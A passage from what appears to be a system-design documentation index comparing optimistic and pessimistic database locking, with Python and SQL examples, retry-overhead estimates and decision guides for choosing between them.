Locking:\n\u251c\u2500 Successful transactions: 1\n\u251c\u2500 Failed validations: 9,999 (first attempt)\n\u251c\u2500 Total retries: ~50,000+ (with exponential backoff)\n\u251c\u2500 Database load: EXTREME (constant read-validate-retry)\n\u251c\u2500 Average response time: 15-45 seconds\n\u251c\u2500 Server CPU: 95-100%\n\u2514\u2500 Outcome: System crash or timeout\n\nPessimistic Locking:\n\u251c\u2500 Successful transactions: 1\n\u251c\u2500 Failed validations: 0\n\u251c\u2500 Total retries: 0\n\u251c\u2500 Database load: Moderate (sequential processing)\n\u251c\u2500 Average response time: 50-200ms (queue wait time)\n\u251c\u2500 Server CPU: 40-60%\n\u2514\u2500 Outcome: Stable, predictable\n\"\"\"\n\n\n# FAILURE EXAMPLE 2: Long-Running Transaction\n\ndef generate_complex_report_optimistic(db, month, year):\n    \"\"\"\n    PROBLEM: 5-minute transaction, high conflict probability\n    \"\"\"\n    db.begin()\n\n    # Read data at start (record version)\n    data, version = db.execute(\"\"\"\n        SELECT revenue, expenses, version \n        FROM monthly_summary \n        WHERE month = ? AND year = ?\n    \"\"\", [month, year]).fetchone()\n\n    # Complex calculations (5 minutes)\n    # Meanwhile, other transactions likely modified the data!\n    complex_analysis = perform_intensive_calculations(data)  # 5 minutes\n    statistical_models = run_ml_models(data)  # 3 minutes\n    generate_charts(complex_analysis)  # 2 minutes\n\n    # Try to save results (10 minutes of work)\n    updated = db.execute(\"\"\"\n        UPDATE monthly_summary \n        SET analysis = ?, version = version + 1\n        WHERE month = ? AND year = ? AND version = ?\n    \"\"\", [complex_analysis, month, year, version]).rowcount\n\n    if updated == 0:\n        # VALIDATION FAILED!\n        # 10 minutes of computation WASTED\n        # Must start over from beginning\n        db.rollback()\n        # User frustration: \"Why is this taking so long?\"\n        return {\"success\": False, \"reason\": \"conflict\"}\n\n    db.commit()\n    return {\"success\": True}\n\n\n# BETTER SOLUTION: Pessimistic Locking for Long Transactions\n\ndef generate_complex_report_pessimistic(db, month, year):\n    \"\"\"\n    SOLUTION: Lock data at start of long transaction\n    \"\"\"\n    db.begin()\n\n    try:\n        # LOCK row at start (FOR UPDATE)\n        data = db.execute(\"\"\"\n            SELECT revenue, expenses \n            FROM monthly_summary \n            WHERE month = ? AND year = ?\n            FOR UPDATE\n        \"\"\", [month, year]).fetchone()\n\n        # Now do calculations knowing data is locked\n        # No one can modify it while we work\n        complex_analysis = perform_intensive_calculations(data)\n        statistical_models = run_ml_models(data)\n        generate_charts(complex_analysis)\n\n        # Save results (guaranteed to succeed)\n        db.execute(\"\"\"\n            UPDATE monthly_summary \n            SET analysis = ?\n            WHERE month = ? AND year = ?\n        \"\"\", [complex_analysis, month, year])\n\n        db.commit()\n        return {\"success\": True}\n\n    except Exception as e:\n        db.rollback()\n        return {\"success\": False, \"reason\": str(e)}\n\n\n# FAILURE EXAMPLE 3: Write-Heavy Workload\n\ndef process_sensor_data_optimistic(db, sensor_id, reading):\n    \"\"\"\n    PROBLEM: 1000 sensors sending data every second\n    All writing to same aggregate table\n    \"\"\"\n    max_retries = 3\n\n    for attempt in range(max_retries):\n        db.begin()\n\n        try:\n            # Read current aggregate\n            total, count, version = db.execute(\"\"\"\n                SELECT total_readings, count, version \n                FROM sensor_aggregates \n                WHERE sensor_type = ?\n            \"\"\", [get_sensor_type(sensor_id)]).fetchone()\n\n            # Update aggregate\n            updated = db.execute(\"\"\"\n                UPDATE sensor_aggregates \n                SET total_readings = ?, count = ?, version = version + 1\n                WHERE sensor_type = ? AND version = ?\n            \"\"\", [total + reading, count + 1, \n                  get_sensor_type(sensor_id), version]).rowcount\n\n            if updated == 0:\n                # CONSTANT CONFLICTS!\n                # 1000 sensors \u00d7 1 update/sec = 1000 updates/sec\n                # Success rate: &lt;10% on first try\n                # 900+ retries per second\n                # Database overwhelmed\n                db.rollback()\n                continue\n\n            db.commit()\n            return True\n\n        except Exception as e:\n            db.rollback()\n\n    # Many sensors fail to record data!\n    return False\n\n\n# BETTER SOLUTION: Use atomic operations or redesign\n\ndef process_sensor_data_better(db, sensor_id, reading):\n    \"\"\"\n    SOLUTION 1: Atomic increment (no version check needed)\n    \"\"\"\n    db.begin()\n    db.execute(\"\"\"\n        UPDATE sensor_aggregates \n        SET total_readings = total_readings + ?,\n            count = count + 1\n        WHERE sensor_type = ?\n    \"\"\", [reading, get_sensor_type(sensor_id)])\n    db.commit()\n\n\ndef process_sensor_data_better_v2(db, sensor_id, reading):\n    \"\"\"\n    SOLUTION 2: Partition data (reduce contention)\n    \"\"\"\n    db.begin()\n    # Each sensor has its own row (no conflicts!)\n    db.execute(\"\"\"\n        INSERT INTO sensor_readings (sensor_id, reading, timestamp)\n        VALUES (?, ?, NOW())\n    \"\"\", [sensor_id, reading])\n    db.commit()\n\n    # Aggregate asynchronously in background job\n</code></pre> <p>Mathematical Analysis of Retry Overhead:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     RETRY OVERHEAD CALCULATION                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario: N transactions competing for same resource    \u2502\n\u2502                                                         \u2502\n\u2502 Optimistic Locking:                                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Probability of success on first try: 1/N   \u2502         \u2502\n\u2502 \u2502 Expected retries per transaction: N-1      \u2502         \u2502\n\u2502 \u2502 Total work: N \u00d7 (1 + (N-1)) = N\u00b2           \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Example with N=100:                        \u2502         \u2502\n\u2502 \u2502 \u2022 Success rate: 1% first try               \u2502         \u2502\n\u2502 \u2502 \u2022 Average retries: 99 per transaction      \u2502         \u2502\n\u2502 \u2502 \u2022 Total operations: 10,000 (100\u00b2)          \u2502         \u2502\n\u2502 \u2502 \u2022 Wasted work: 9,900 operations (99%)      \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 Pessimistic Locking:                                    \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Probability of success: 100%               \u2502         \u2502\n\u2502 \u2502 Expected retries: 0                        \u2502         \u2502\n\u2502 \u2502 Total work: N \u00d7 1 = N                      \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Example with N=100:                        \u2502         \u2502\n\u2502 \u2502 \u2022 Success rate: 100% first try             \u2502         \u2502\n\u2502 \u2502 \u2022 Average retries: 0                       \u2502         \u2502\n\u2502 \u2502 \u2022 Total operations: 100                    \u2502         \u2502\n\u2502 \u2502 \u2022 Wasted work: 0 operations (0%)           \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 Efficiency Comparison:                                  \u2502\n\u2502 \u2022 Optimistic: O(N\u00b2) work                                \u2502\n\u2502 \u2022 Pessimistic: O(N) work                                \u2502\n\u2502                                                         \u2502\n\u2502 Crossover Point:                                        \u2502\n\u2502 \u2022 Low contention (N &lt; 10): Optimistic better           \u2502\n\u2502 \u2022 High contention (N &gt; 50): Pessimistic better         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Decision Matrix: When to AVOID Optimistic Concurrency Control:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     DON'T USE OPTIMISTIC CONTROL WHEN:                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 \u274c Conflict Rate &gt; 20%                                  \u2502\n\u2502    \u2192 Too many retries waste resources                   \u2502\n\u2502                                                         \u2502\n\u2502 \u274c Transaction Duration &gt; 10 seconds                    \u2502\n\u2502    \u2192 High probability of conflicts during execution     \u2502\n\u2502                                                         \u2502\n\u2502 \u274c Write-Heavy Workload (&gt;50% writes)                   \u2502\n\u2502    \u2192 Constant conflicts, no benefit from lock-free reads\u2502\n\u2502                                                         \u2502\n\u2502 \u274c Limited Inventory / Hot Spots                        \u2502\n\u2502    \u2192 Many transactions compete for same items           \u2502\n\u2502                                                         \u2502\n\u2502 \u274c Critical Financial Data                              \u2502\n\u2502    \u2192 Cost of retry too high, need guaranteed success    \u2502\n\u2502                                                         \u2502\n\u2502 \u274c Real-Time / Time-Sensitive Operations                \u2502\n\u2502    \u2192 Retries cause unpredictable latency                \u2502\n\u2502                                                         \u2502\n\u2502 \u274c External Side Effects                                \u2502\n\u2502    \u2192 Can't rollback API calls, emails, payments         \u2502\n\u2502                                                         \u2502\n\u2502 \u274c No Retry Infrastructure                              \u2502\n\u2502    \u2192 Application can't handle conflicts gracefully      \u2502\n\u2502                                                         \u2502\n\u2502 \u274c User-Facing Critical Path                            \u2502\n\u2502    \u2192 Retries impact user experience negatively          \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     USE PESSIMISTIC CONTROL INSTEAD WHEN:               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 \u2713 Banking, financial transactions                       \u2502\n\u2502 \u2713 Inventory management                                  \u2502\n\u2502 \u2713 Ticket/seat booking systems                           \u2502\n\u2502 \u2713 Limited resource allocation                           \u2502\n\u2502 \u2713 Critical data updates                                 \u2502\n\u2502 \u2713 Long-running batch jobs                               \u2502\n\u2502 \u2713 High-contention scenarios                             \u2502\n\u2502 \u2713 Predictable performance required                      \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Key Takeaways:</p> <ol> <li> <p>Optimistic Control is NOT a universal solution - it fails catastrophically under high contention</p> </li> <li> <p>Context matters - same technique can be optimal or terrible depending on workload characteristics</p> </li> <li> <p>Mathematical reality - retry overhead grows quadratically (O(N\u00b2)) with contention level</p> </li> <li> <p>User experience - retries cause unpredictable latency, frustrating users</p> </li> <li> <p>Choose based on data - measure actual conflict rates, don't assume they're low</p> </li> <li> <p>Hybrid approaches - use optimistic for low-contention data, pessimistic for hot spots</p> </li> <li> <p>Infrastructure requirements - optimistic control needs sophisticated retry logic, monitoring, and error handling</p> </li> </ol>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#43-comparison-pessimistic-vs-optimistic","title":"4.3 Comparison: Pessimistic vs Optimistic","text":"<p>Side-by-Side Comparison:</p> Aspect Pessimistic Locking Optimistic Locking Assumption Conflicts are likely Conflicts are rare Strategy Prevent conflicts with locks Detect conflicts at commit Locking Acquires locks immediately No locks during read/modify Blocking Transactions wait for locks No blocking Deadlocks Possible (circular locks) Not possible (no locks) Validation Not needed (locks guarantee) Required at commit time Retries No retries needed May require retries on conflict Concurrency Lower (locks block) Higher (no locks) Performance (Low Contention) Slower (lock overhead) Faster (no locks) Performance (High Contention) Better (no wasted work) Worse (many retries) Complexity Simpler (locks handle it) More complex (retry logic) Best For High contention, critical data Low contention, read-heavy Examples Banking, inventory Content management, caching <p>Visual Comparison:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           PESSIMISTIC vs OPTIMISTIC                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  PESSIMISTIC (Lock First):                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510              \u2502\n\u2502  \u2502 T1: Lock \u2192 Read \u2192 Modify \u2192 Commit    \u2502              \u2502\n\u2502  \u2502     \ud83d\udd12    (safe)  (safe)   \ud83d\udd13       \u2502              \u2502\n\u2502  \u2502                                      \u2502              \u2502\n\u2502  \u2502 T2:        [WAITING......] \u2192 Start   \u2502              \u2502\n\u2502  \u2502                              (after  \u2502              \u2502\n\u2502  \u2502                               T1)    \u2502              \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2502\n\u2502                                                         \u2502\n\u2502  Pros: No conflicts, predictable                        \u2502\n\u2502  Cons: Blocking, lower concurrency                      \u2502\n\u2502                                                         \u2502\n\u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n\u2502                                                         \u2502\n\u2502  OPTIMISTIC (Check Later):                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510              \u2502\n\u2502  \u2502 T1: Read \u2192 Modify \u2192 Validate \u2192 Commit\u2502              \u2502\n\u2502  \u2502     (v1)   (local)    \u2713       (v2)   \u2502              \u2502\n\u2502  \u2502                                      \u2502              \u2502\n\u2502  \u2502 T2: Read \u2192 Modify \u2192 Validate \u2192 Abort \u2502              \u2502\n\u2502  \u2502     (v1)   (local)    \u2717      RETRY  \u2502              \u2502\n\u2502  \u2502            (parallel)         (v1\u2192v2)\u2502              \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2502\n\u2502                                                         \u2502\n\u2502  Pros: No blocking, high concurrency                    \u2502\n\u2502  Cons: Wasted work, retries                             \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Decision Tree:</p> <pre><code>Choose Concurrency Control Strategy:\n\nHigh Contention (many conflicts)?\n\u251c\u2500 YES \u2192 Use PESSIMISTIC\n\u2502   \u251c\u2500 Prevents wasted work\n\u2502   \u251c\u2500 Predictable performance\n\u2502   \u2514\u2500 Example: Bank transfers, ticket booking\n\u2502\n\u2514\u2500 NO \u2192 Use OPTIMISTIC\n    \u251c\u2500 Better performance\n    \u251c\u2500 Higher concurrency\n    \u2514\u2500 Example: Document editing, product catalog\n\nCritical Data (must be exact)?\n\u251c\u2500 YES \u2192 Use PESSIMISTIC\n\u2502   \u2514\u2500 Guaranteed consistency\n\u2502\n\u2514\u2500 NO \u2192 Use OPTIMISTIC\n    \u2514\u2500 Acceptable to retry\n\nRead-Heavy Workload?\n\u251c\u2500 YES \u2192 Use OPTIMISTIC\n\u2502   \u2514\u2500 Readers don't block\n\u2502\n\u2514\u2500 NO (Write-Heavy) \u2192 Use PESSIMISTIC\n    \u2514\u2500 Avoid retry storms\n\nDistributed System?\n\u251c\u2500 YES \u2192 Use OPTIMISTIC\n\u2502   \u2514\u2500 Locks don't scale across nodes\n\u2502\n\u2514\u2500 NO (Single DB) \u2192 Either works\n    \u2514\u2500 Choose based on contention\n</code></pre> <p>Real-World Scenarios:</p> <pre><code># Scenario 1: High Contention \u2192 Pessimistic\n# Use Case: Ticket booking system (limited inventory)\n\ndef book_ticket_pessimistic(db, event_id, user_id):\n    \"\"\"\n    Pessimistic is better here because:\n    - High contention (popular events sell out fast)\n    - Limited inventory (conflicts very likely)\n    - Critical to prevent overbooking\n    \"\"\"\n    db.begin()\n\n    try:\n        # LOCK the event row immediately\n        available = db.execute(\"\"\"\n            SELECT tickets_available FROM events \n            WHERE id = ? \n            FOR UPDATE\n        \"\"\", [event_id]).fetchone()[0]\n\n        if available &lt;= 0:\n            raise SoldOutError()\n\n        # Update inventory (lock held)\n        db.execute(\"\"\"\n            UPDATE events \n            SET tickets_available = tickets_available - 1\n            WHERE id = ?\n        \"\"\", [event_id])\n\n        # Create booking\n        db.execute(\"\"\"\n            INSERT INTO bookings (event_id, user_id)\n            VALUES (?, ?)\n        \"\"\", [event_id, user_id])\n\n        db.commit()\n        return True\n\n    except Exception as e:\n        db.rollback()\n        return False\n\n\n# Scenario 2: Low Contention \u2192 Optimistic\n# Use Case: Blog post editing (infrequent updates)\n\ndef update_blog_post_optimistic(db, post_id, new_content, version):\n    \"\"\"\n    Optimistic is better here because:\n    - Low contention (rare concurrent edits)\n    - Read-heavy workload\n    - No need to block readers\n    \"\"\"\n    db.begin()\n\n    try:\n        # Update with version check (no locks!)\n        updated = db.execute(\"\"\"\n            UPDATE posts \n            SET content = ?, version = version + 1, updated_at = NOW()\n            WHERE id = ? AND version = ?\n        \"\"\", [new_content, post_id, version]).rowcount\n\n        if updated == 0:\n            # Conflict! Someone else edited\n            db.rollback()\n            return {\n                'success': False,\n                'error': 'Post was modified by another user. Please refresh.'\n            }\n\n        db.commit()\n        return {'success': True}\n\n    except Exception as e:\n        db.rollback()\n        return {'success': False, 'error': str(e)}\n\n\n# Scenario 3: Hybrid Approach\n# Use Case: E-commerce shopping cart\n\ndef checkout_order_hybrid(db, cart_id, user_id):\n    \"\"\"\n    Hybrid approach:\n    - Optimistic for cart items (low contention)\n    - Pessimistic for inventory (high contention)\n    \"\"\"\n    db.begin()\n\n    try:\n        # Step 1: Read cart items (optimistic - no locks)\n        cart_items = db.execute(\"\"\"\n            SELECT product_id, quantity, version \n            FROM cart_items \n            WHERE cart_id = ?\n        \"\"\", [cart_id]).fetchall()\n\n        # Step 2: Lock inventory rows (pessimistic - prevent overselling)\n        for item in cart_items:\n            stock = db.execute(\"\"\"\n                SELECT quantity FROM inventory \n                WHERE product_id = ? \n                FOR UPDATE\n            \"\"\", [item['product_id']]).fetchone()[0]\n\n            if stock &lt; item['quantity']:\n                raise OutOfStockError(item['product_id'])\n\n            # Reserve inventory\n            db.execute(\"\"\"\n                UPDATE inventory \n                SET quantity = quantity - ?\n                WHERE product_id = ?\n            \"\"\", [item['quantity'], item['product_id']])\n\n        # Step 3: Create order (validate cart versions - optimistic)\n        for item in cart_items:\n            # Ensure cart wasn't modified\n            exists = db.execute(\"\"\"\n                SELECT 1 FROM cart_items \n                WHERE cart_id = ? AND product_id = ? AND version = ?\n            \"\"\", [cart_id, item['product_id'], item['version']]).fetchone()\n\n            if not exists:\n                raise CartModifiedError()\n\n        # Create order\n        db.execute(\"\"\"\n            INSERT INTO orders (user_id, total, timestamp)\n            VALUES (?, ?, NOW())\n        \"\"\", [user_id, calculate_total(cart_items)])\n\n        db.commit()\n        return True\n\n    except Exception as e:\n        db.rollback()\n        return False\n</code></pre> <p>Performance Comparison:</p> <pre><code>Performance vs Contention Level:\n\nThroughput\n    \u2502\n    \u2502  Optimistic \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2572\n    \u2502                        \u2572\n    \u2502                         \u2572\n    \u2502                          \u2572\n    \u2502                           \u2572___________\n    \u2502  Pessimistic _____________/\n    \u2502                          /\n    \u2502                         /\n    \u2502                        /\n    \u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500/\n    \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba Contention\n      Low                                    High\n\nKey Insights:\n\u2022 Low Contention: Optimistic wins (no lock overhead)\n\u2022 High Contention: Pessimistic wins (no retry overhead)\n\u2022 Crossover point: ~20-30% conflict rate (depends on workload)\n</code></pre> <p>When to Use Each:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              USE PESSIMISTIC WHEN:                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 \u2022 High contention expected                              \u2502\n\u2502 \u2022 Critical data (financial, inventory)                  \u2502\n\u2502 \u2022 Cost of conflict is high                              \u2502\n\u2502 \u2022 Single database (not distributed)                     \u2502\n\u2502 \u2022 Predictable performance required                      \u2502\n\u2502 \u2022 Examples:                                             \u2502\n\u2502   - Banking transactions                                \u2502\n\u2502   - Ticket booking                                      \u2502\n\u2502   - Inventory management                                \u2502\n\u2502   - Seat reservations                                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              USE OPTIMISTIC WHEN:                       